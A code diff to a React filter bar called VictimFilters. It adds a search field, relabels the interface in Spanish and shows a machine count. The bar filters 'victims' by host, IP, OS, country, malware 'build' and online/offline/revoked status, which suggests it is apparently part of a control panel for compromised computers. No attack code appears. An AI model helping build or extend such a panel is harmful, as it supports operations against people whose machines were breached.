@@ -1,16 +1,24 @@
 'use client';
 import { useEffect, useState } from 'react';
 import { useRouter, useSearchParams } from 'next/navigation';
+import { Search, X } from 'lucide-react';
 import { Input, Select } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { useDebounced } from '@/hooks/useApi';
-import { X } from 'lucide-react';
 
-export function VictimFilters({ countries, builds = [] }: { countries: string[]; builds?: Array<{ id: string; name: string; version: string }> }) {
+export function VictimFilters({
+  countries,
+  builds = [],
+  total
+}: {
+  countries: string[];
+  builds?: Array<{ id: string; name: string; version: string }>;
+  total?: number;
+}) {
   const router = useRouter();
   const params = useSearchParams();
   const [q, setQ] = useState(params.get('q') ?? '');
-  const debounced = useDebounced(q, 350);
+  const debounced = useDebounced(q, 300);
   const [os, setOs] = useState(params.get('os') ?? '');
   const [status, setStatus] = useState(params.get('status') ?? '');
   const [country, setCountry] = useState(params.get('country') ?? '');
@@ -29,30 +37,50 @@ export function VictimFilters({ countries, builds = [] }: { countries: string[];
   }, [debounced, os, status, country, tag, build]); // eslint-disable-line react-hooks/exhaustive-deps
 
   const active = Boolean(q || os || status || country || tag || build);
+  const clear = () => { setQ(''); setOs(''); setStatus(''); setCountry(''); setTag(''); setBuild(''); };
+
   return (
-    <div className="flex flex-wrap items-center gap-1.5 border-b border-line px-3 py-2">
-      <Input value={q} onChange={(event) => setQ(event.target.value)} placeholder="host, user, ip, tag…" className="w-56" />
-      <Select value={os} onChange={(event) => setOs(event.target.value)}>
-        <option value="">all OS</option><option value="windows">windows</option><option value="linux">linux</option><option value="macos">macos</option>
+    <div className="flex flex-wrap items-center gap-1.5 border-b border-line px-3 py-1.5">
+      <div className="relative w-64">
+        <Search className="pointer-events-none absolute left-2 top-1.5 h-3.5 w-3.5 text-muted/60" />
+        <Input
+          id="victim-search"
+          value={q}
+          onChange={(event) => setQ(event.target.value)}
+          onKeyDown={(event) => { if (event.key === 'Escape') { setQ(''); event.currentTarget.blur(); } }}
+          placeholder="equipo, usuario, IP, etiqueta…"
+          className="h-7 w-64 pl-7 font-mono"
+          aria-label="Buscar equipos"
+        />
+      </div>
+      <Select value={status} onChange={(event) => setStatus(event.target.value)} aria-label="Estado" className="h-7">
+        <option value="">cualquier estado</option>
+        <option value="online">online</option>
+        <option value="stale">sin señal</option>
+        <option value="offline">offline</option>
+        <option value="revoked">revocada</option>
       </Select>
-      <Select value={status} onChange={(event) => setStatus(event.target.value)}>
-        <option value="">any state</option><option value="online">online</option><option value="stale">stale</option><option value="offline">offline</option><option value="revoked">revoked</option>
+      <Select value={os} onChange={(event) => setOs(event.target.value)} aria-label="Sistema" className="h-7">
+        <option value="">cualquier SO</option>
+        <option value="windows">windows</option>
+        <option value="linux">linux</option>
+        <option value="macos">macos</option>
       </Select>
-      <Select value={country} onChange={(event) => setCountry(event.target.value)}>
-        <option value="">any country</option>
+      <Select value={country} onChange={(event) => setCountry(event.target.value)} aria-label="País" className="h-7">
+        <option value="">cualquier país</option>
         {countries.map((item) => <option key={item} value={item}>{item}</option>)}
       </Select>
-      <Input value={tag} onChange={(event) => setTag(event.target.value)} placeholder="tag" className="w-28" />
-      <Select value={build} onChange={(event) => setBuild(event.target.value)}>
-        <option value="">any build</option>
+      <Input value={tag} onChange={(event) => setTag(event.target.value)} placeholder="grupo/etiqueta" className="h-7 w-32" aria-label="Etiqueta" />
+      <Select value={build} onChange={(event) => setBuild(event.target.value)} aria-label="Build" className="h-7">
+        <option value="">cualquier build</option>
         {builds.map((item) => <option key={item.id} value={item.id}>{item.name} v{item.version}</option>)}
       </Select>
       {active ? (
-        <Button variant="ghost" size="sm" onClick={() => { setQ(''); setOs(''); setStatus(''); setCountry(''); setTag(''); setBuild(''); }}>
-          <X className="h-3 w-3" /> clear
-        </Button>
+        <Button variant="ghost" size="sm" onClick={clear}><X className="h-3 w-3" /> limpiar</Button>
       ) : null}
-      <span className="ml-auto font-mono text-2xs text-muted">filters apply live</span>
+      <span className="ml-auto font-mono text-2xs text-muted">
+        {total != null ? `${total} equipos` : 'filtros en vivo'} · <kbd className="rounded border border-line px-1">/</kbd> buscar
+      </span>
     </div>
   );
 }
